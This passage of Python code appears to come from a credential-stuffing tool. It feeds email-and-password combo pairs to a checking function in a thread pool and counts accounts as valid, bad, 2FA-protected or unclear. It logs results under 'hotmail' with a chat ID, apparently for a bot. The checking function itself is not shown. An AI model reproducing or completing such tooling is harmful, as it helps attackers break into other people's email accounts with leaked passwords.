        with ThreadPoolExecutor(max_workers=config.THREADS) as ex:
            pending = set()
            for combo in job.combos:
                if job.cancelled:
                    break
                while len(pending) >= config.THREADS * 2:
                    done, pending = concurrent.futures.wait(
                        pending,
                        return_when=concurrent.futures.FIRST_COMPLETED)
                    for f in done:
                        with job.lock:
                            job.processed += 1
                    if job.cancelled:
                        break
                if job.cancelled:
                    break
                e, p = combo[0], combo[1]
                pending.add(ex.submit(_safe_check, fn, job, e, p))
            # drain remainder
            for f in as_completed(pending):
                with job.lock:
                    job.processed += 1
                if job.cancelled:
                    for fx in pending:
                        fx.cancel()
                    break
    finally:
        done_evt.set()
        try: reporter(force=True)
        except: pass

    log("hotmail", f"done chat={job.chat_id} valid={job.valid} bad={job.bad} "
                   f"2fa={job.twofa} net={job.net} unclear={job.unclear}", "DONE")
